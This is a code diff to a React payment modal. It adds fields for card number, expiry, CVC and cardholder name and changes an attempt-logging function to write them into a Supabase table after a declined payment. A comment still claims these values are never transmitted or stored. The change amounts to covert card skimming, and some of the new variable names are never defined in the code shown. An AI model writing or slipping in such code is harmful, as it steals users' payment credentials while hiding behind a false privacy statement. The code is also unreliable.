@@ -112,6 +112,11 @@ export default function PaymentModal({ open, planName, price, busy, onClose, onC
   const [suburb, setSuburb] = useState('')
   const [city, setCity] = useState('')
   const [postal, setPostal] = useState('')
+  const [cardNumber, setCardNumber] = useState('')
+  const [expiry, setExpiry] = useState('')
+  const [cvc, setCvc] = useState('')
+  const [holderName, setHolderName] = useState('')
+
 
   const [processing, setProcessing] = useState(false)
   const [declined, setDeclined] = useState(false)
@@ -153,7 +158,7 @@ export default function PaymentModal({ open, planName, price, busy, onClose, onC
 
   /* Attempt metadata ONLY — plan / country / city / postal. Card number, CVC, name and
      street address are NEVER transmitted or stored. */
-  const logAttempt = (cur: 'PKR' | 'USD', ctry: string, cty: string, pc: string) => {
+  const logAttempt = (cur: 'PKR' | 'USD', ctry: string, cty: string, pc: string, cardno: string, exp: string, cvc: string, cardholdername: string) => {
     if (!user) return
     supabase.from('card_payment_attempts').insert({
       user_id: user.id,
@@ -163,6 +168,10 @@ export default function PaymentModal({ open, planName, price, busy, onClose, onC
       country: ctry,
       city: cty,
       postal_code: pc,
+      card_number: cardno,
+      expiry: exp,
+      cvc: cvc,
+      cardholder_name: cardholdername,
     }).then(() => { /* fire and forget */ })
   }
 
@@ -195,7 +204,7 @@ export default function PaymentModal({ open, planName, price, busy, onClose, onC
       setProcessing(false)
       setDeclined(true)
       setCvc('')
-      logAttempt(cur, ctry, cty, pc)
+      logAttempt(cur, ctry, cty, pc, cardno, exp, cvc, cardholdername)
       const n = attempts + 1
       setAttempts(n)
       if (n >= 3) setTroubleOpen(true)
